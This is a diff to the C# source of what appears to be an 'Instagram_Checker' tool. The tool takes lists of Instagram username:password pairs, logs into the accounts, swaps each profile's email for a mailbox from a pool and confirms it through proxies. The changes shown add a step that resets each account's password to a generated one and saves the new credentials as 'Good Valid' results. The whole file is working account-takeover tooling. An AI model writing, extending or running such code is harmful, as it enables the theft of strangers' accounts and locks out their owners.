@@ -151,7 +151,6 @@ namespace Instagram_Checker.BLL
                 object[] options = new object[2] { obj, delay };
                 worker.RunWorkerAsync(options);
                 _threadCount++;
-                //CheckInsta(opt, delay);
             }
 
             BackgroundWorker checkThreads = new BackgroundWorker();
@@ -258,9 +257,12 @@ namespace Instagram_Checker.BLL
                                 _accMails.Mails.Remove(_accMails.Mails[randomPosition]);
                                 _accMails.MailsForDeleting.Add(resMail["mailLogin"] + ":" + resMail["mailPassword"]);
 
+                                string writePassword = instOptions[i]["instaPassword"];
 
                                 DateTime time = DateTime.Now;
+                                Thread.Sleep(1000);
                                 UpdateProfileResult updateStatus = await android.UpdateProfile(profile, resMail["mailLogin"]);
+                                
                                 if (updateStatus.status == "ok")
                                 {
                                     bool confirmed = true;
@@ -269,7 +271,7 @@ namespace Instagram_Checker.BLL
                                     {
                                         Mail mailClient = new Mail(resMail["mailLogin"], resMail["mailPassword"]);
                                         path = mailClient.GetMailPath(time);
-                                        confirmed = android.ConfirmMail(path, _proxy.MailProxies[Randomer.Next(0, _proxy.MailProxies.Count)]);                                        
+                                        confirmed = android.ConfirmMail(path, _proxy.MailProxies[Randomer.Next(0, _proxy.MailProxies.Count)]);
                                     }
                                     catch
                                     {
@@ -277,13 +279,22 @@ namespace Instagram_Checker.BLL
                                         confirmed = false;
                                     }
 
+
+                                    string newPass = Generator.GeneratePassword();
+                                    PasswordChangeResult passResult = await android.ChangePassword(newPass);
+                                    if (passResult.status == "ok")
+                                        writePassword = newPass;
+                                    else
+                                        _fileWorker.BadPass($"{profile.form_data.username}:{instOptions[i]["instaPassword"]}");
+
+
                                     if (confirmed)
                                     {
-                                        string goodValidResult = profile.form_data.username + ":" + instOptions[i]["instaPassword"] + ":" + resMail["mailLogin"] + ":" + resMail["mailPassword"];
+                                        string goodValidResult = profile.form_data.username + ":" + writePassword + ":" + resMail["mailLogin"] + ":" + resMail["mailPassword"];
                                         AccountInfoDataSet_Success.Add(goodValidResult);
                                         logging.Invoke(LogIO.easyPath, new Log()
                                         {
-                                            UserName = $"{profile.form_data.username}:{instOptions[i]["instaPassword"]}",
+                                            UserName = $"{profile.form_data.username}:{writePassword}",
                                             Date = DateTime.Now,
                                             LogMessage = "Good Valid",
                                             Method = "Model.CheckInsta"
@@ -292,11 +303,11 @@ namespace Instagram_Checker.BLL
                                     }
                                     else
                                     {
-                                        string mailNotConfirmedResult = profile.form_data.username + ":" + instOptions[i]["instaPassword"] + ":" + resMail["mailLogin"] + ":" + resMail["mailPassword"];
+                                        string mailNotConfirmedResult = profile.form_data.username + ":" + writePassword + ":" + resMail["mailLogin"] + ":" + resMail["mailPassword"];
                                         AccountInfoDataSet_Success.Add(mailNotConfirmedResult);
                                         logging.Invoke(LogIO.easyPath, new Log()
                                         {
-                                            UserName = $"{profile.form_data.username}:{instOptions[i]["instaPassword"]}",
+                                            UserName = $"{profile.form_data.username}:{writePassword}",
                                             Date = DateTime.Now,
                                             LogMessage = $"Mail have troubles. Account not confirmed, but mail changed",
                                             Method = "Model.CheckInsta"
@@ -309,7 +320,7 @@ namespace Instagram_Checker.BLL
                                 }
                                 else
                                 {
-                                    string account = instOptions[i]["instaLogin"] + ":" + instOptions[i]["instaPassword"];
+                                    string account = instOptions[i]["instaLogin"] + ":" + writePassword;
                                     var checkProfile = await android.GetProfile();
                                     if (profile.form_data.email == checkProfile.form_data.email && !String.IsNullOrEmpty(checkProfile.form_data.phone_number))
                                     {
@@ -557,7 +568,7 @@ namespace Instagram_Checker.BLL
         }
         private void CheckThreads_DoWork(object sender, DoWorkEventArgs e)
         {
-            while(_threadCount > 0)
+            while (_threadCount > 0)
             {
                 Thread.Sleep(5000);
             }
